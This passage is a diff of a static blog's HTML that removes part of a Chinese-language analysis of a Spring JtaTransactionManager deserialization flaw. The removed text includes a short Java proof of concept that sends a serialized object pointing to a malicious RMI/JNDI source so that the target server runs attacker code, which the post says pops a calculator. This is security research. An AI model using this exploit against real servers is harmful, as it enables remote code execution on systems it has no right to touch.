class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>而<code>execute()</code>方法的定义如下</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">execute</span><span class="params">(JndiCallback&lt;T&gt; contextCallback)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Context ctx = <span class="keyword">this</span>.getContext();</span><br><span class="line"></span><br><span class="line">        Object var3;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var3 = contextCallback.doInContext(ctx);<span class="comment">//此处触发RCE</span></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.releaseContext(ctx);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var3;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>可以看到在整个流程的最后将会查询最开始我们由反序列化传入的<code>org.springframework.transaction.jta.JtaTransactionManager</code>类的对象的<code>userTransactionName</code>属性，最终导致加载了我们恶意的rmi源中的恶意类，从而导致RCE。</p>
-<h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><p>这个漏洞的Poc构造比起之前分析的apache common collections反序列化的Poc构造显然要简单许多：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">"Connecting to server "</span>+serverAddress+<span class="string">":"</span>+port);</span><br><span class="line">Socket socket=<span class="keyword">new</span> Socket(serverAddress,port);</span><br><span class="line">System.out.println(<span class="string">"Connected to server"</span>);</span><br><span class="line">String jndiAddress = <span class="string">"rmi://127.0.0.1:1099/Object"</span>;<span class="comment">//恶意的rmi注册源</span></span><br><span class="line">			</span><br><span class="line">org.springframework.transaction.jta.JtaTransactionManager object = <span class="keyword">new</span> org.springframework.transaction.jta.JtaTransactionManager();</span><br><span class="line">object.setUserTransactionName(jndiAddress);</span><br><span class="line">			</span><br><span class="line">System.out.println(<span class="string">"Sending object to server..."</span>);</span><br><span class="line">ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">objectOutputStream.writeObject(object);</span><br><span class="line">objectOutputStream.flush();</span><br></pre></td></tr></table></figure>
-<p>执行后可以发现成功弹出计算器。</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g02nr05wyuj317r0o1qem.jpg" alt></p>
-<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://blog.csdn.net/wn084/article/details/80729230">https://blog.csdn.net/wn084/article/details/80729230</a></p>
-<p><a href="https://github.com/zerothoughts/spring-jndi">https://github.com/zerothoughts/spring-jndi</a></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2283,7 +2261,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">59</span>
+                    <span class="site-state-item-count">60</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
